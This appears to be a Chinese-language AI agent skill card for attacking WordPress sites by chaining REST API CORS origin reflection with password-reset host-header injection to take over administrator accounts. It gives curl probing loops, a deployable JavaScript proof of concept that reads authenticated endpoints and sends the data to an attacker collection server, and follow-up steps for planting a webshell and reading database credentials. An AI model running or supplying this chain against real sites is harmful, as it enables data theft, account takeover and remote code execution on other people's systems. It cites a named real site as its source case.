---
name: 坞·歇门
description: >-
  WordPress REST API CORS 错误配置 → 账户接管链。WP 核心默认反射任意 Origin +
  Credentials，结合密码重置 X-Forwarded-Host 注入可形成完整 ATO。目标出现
  WordPress wp-json、REST API CORS 反射、密码重置 Host 注入时使用。
  通用 CORS 走 cors-exploitation，xmlrpc 走 wordpress-xmlrpc-surface。
globs:
  - "案卷/*/接管/CORS*"
  - "案卷/*/案卷/wp_cors*"
---

# WordPress REST API CORS → Account Takeover

**前提**：目标在 `授权范围`，且已确认为 WordPress。

## 成功口径

| 档 | 成立 | 不算 |
|----|------|------|
| L1 | `/wp-json/` 反射任意 Origin + `ACAC: true` | `ACAO: *` 无 `ACAC` |
| L2 | 预检 OPTIONS 允许 PUT/DELETE/PATCH + Credentials | 只读 GET |
| L3 | CORS 窃取认证数据 + 密码重置 Host 注入组合 ATO | 只有 CORS 无法触发重置 |

## 何时启用

- WordPress REST API `/wp-json/` 可访问
- `curl -H "Origin: https://evil.com"` 响应含 `ACAO: https://evil.com` + `ACAC: true`
- 密码重置 `POST /wp-login.php?action=lostpassword` 接受 `X-Forwarded-Host`

## 漏洞原理

WordPress 核心 `rest_send_cors_headers()` 默认行为：
1. 反射请求中的 `Origin` 头到 `Access-Control-Allow-Origin`
2. 附加 `Access-Control-Allow-Credentials: true`
3. OPTIONS 预检允许 `GET, POST, PUT, PATCH, DELETE`
4. 允许 `Authorization`, `X-WP-Nonce`, `Content-Type` 等敏感头

这意味着任意第三方网站可在已认证用户的浏览器上下文中，跨域读取/写入 WP REST API。

## 快速检测（3 条命令）

```bash
# 1. CORS 反射检测
curl -sk -H "Origin: https://evil.attacker.com" \
  https://TARGET/wp-json/wp/v2/users \
  -D- -o /dev/null 2>&1 | grep -iE "access-control|origin"

# 2. 预检请求检测（写操作权限）
curl -sk -X OPTIONS \
  -H "Origin: https://evil.attacker.com" \
  -H "Access-Control-Request-Method: DELETE" \
  https://TARGET/wp-json/wp/v2/users/me \
  -D- -o /dev/null 2>&1 | grep -iE "access-control"

# 3. 密码重置 Host 注入检测
curl -sk -X POST https://TARGET/wp-login.php?action=lostpassword \
  -H "X-Forwarded-Host: evil.attacker.com" \
  -d "user_login=TARGET_ADMIN_USER" \
  -D- -o /dev/null 2>&1 | head -20
```

## 完整利用链

### Phase 1: 确认 CORS + 枚举用户

```bash
# 枚举用户（CORS 加持，但即使无 CORS 也可能公开）
curl -sk https://TARGET/wp-json/wp/v2/users | python3 -m json.tool

# 测试所有敏感端点的 CORS 行为
for EP in users users/me settings plugins posts pages \
          "posts?status=draft" "posts?status=private"; do
  echo "--- $EP ---"
  curl -sk -H "Origin: https://evil.com" \
    "https://TARGET/wp-json/wp/v2/$EP" \
    -D- -o /dev/null 2>&1 | grep -i "access-control"
done
```

### Phase 2: 部署 CORS PoC

```html
<!-- 修改 TARGET 和 EXFIL 后部署到攻击者服务器 -->
<script>
var TARGET = 'https://目标站';
var EXFIL  = 'https://攻击者收集服务器/collect';

var endpoints = [
  '/wp-json/wp/v2/users/me',
  '/wp-json/wp/v2/settings',
  '/wp-json/wp/v2/plugins',
  '/wp-json/wp/v2/users?per_page=100',
  '/wp-json/wp/v2/posts?status=draft&per_page=100',
  '/wp-json/wp/v2/posts?status=private&per_page=100',
  '/wp-json/wp-site-health/v1/directory-sizes'
];

endpoints.forEach(function(ep) {
  var xhr = new XMLHttpRequest();
  xhr.open('GET', TARGET + ep, true);
  xhr.withCredentials = true;
  xhr.onload = function() {
    navigator.sendBeacon(EXFIL, JSON.stringify({
      endpoint: ep, status: xhr.status,
      data: xhr.responseText.substring(0, 5000)
    }));
  };
  xhr.send();
});
</script>
```

### Phase 3: 密码重置 Host 注入 → ATO

```bash
# 从 CORS 窃取的 users/me 响应中获取管理员邮箱后：
# 触发密码重置，注入攻击者域名
curl -sk -X POST https://TARGET/wp-login.php?action=lostpassword \
  -H "X-Forwarded-Host: evil.attacker.com" \
  -d "user_login=ADMIN_USERNAME"

# 如果 WP 使用 X-Forwarded-Host 构建重置 URL：
# 管理员邮箱中的重置链接将指向 evil.attacker.com
# 攻击者截获 token → 重置密码 → 接管后台
```

### Phase 4: 后续（接管后台后）

```
WP 后台 → 外观 → 主题编辑器 → functions.php 写 webshell → RCE
WP 后台 → 插件 → 上传恶意插件 → RCE
读 wp-config.php → 数据库凭据 → 全站数据
```

## 变体测试

```bash
# Host 注入变体（多个头尝试）
for HEADER in "X-Forwarded-Host" "X-Forwarded-Server" "X-Host" \
              "X-Original-URL" "Forwarded"; do
  echo "--- $HEADER ---"
  curl -sk -X POST https://TARGET/wp-login.php?action=lostpassword \
    -H "$HEADER: evil.com" \
    -d "user_login=ADMIN" -D- -o /dev/null 2>&1 | head -5
done

# CORS 特殊 Origin 测试
for ORIGIN in "null" "https://TARGET.evil.com" "https://evil.TARGET" \
              "https://TARGET%60evil.com"; do
  echo "--- $ORIGIN ---"
  curl -sk -H "Origin: $ORIGIN" \
    https://TARGET/wp-json/wp/v2/users \
    -D- -o /dev/null 2>&1 | grep -i "access-control-allow-origin"
done
```

## 与其他 Skill 的关系

- CORS 通用手法 → `cors-exploitation`（本卡专注 WP REST API 场景）
- xmlrpc 暴力破解 → `wordpress-xmlrpc-surface`
- WP 插件 ATO → `wordpress-plugin-unauth-takeover`
- WP 攻击分流 → `wordpress-attack-router`

## 证据落盘

```bash
mkdir -p 案卷/<案卷>/案卷/wp_cors/
mkdir -p 案卷/<案卷>/接管/

# CORS 检测结果
curl -sk -H "Origin: https://evil.com" https://TARGET/wp-json/wp/v2/users \
  -D- > 案卷/<案卷>/案卷/wp_cors/cors_reflect.txt

# PoC 文件
cp CORS_PoC.html 案卷/<案卷>/接管/
```

## 真源

- 手法 Playbook：`传承/薄青·岁岁索命.md`
- 工具入口：`python3 炼蛊房/core_web_surface_probe.py --cors`
- 来源案卷: `案卷/sehuatang_20260902/`
- PoC 模板: `案卷/sehuatang_20260902/接管/CORS_PoC.html`
- WordPress REST API CORS 源码: `wp-includes/rest-api.php` → `rest_send_cors_headers()`
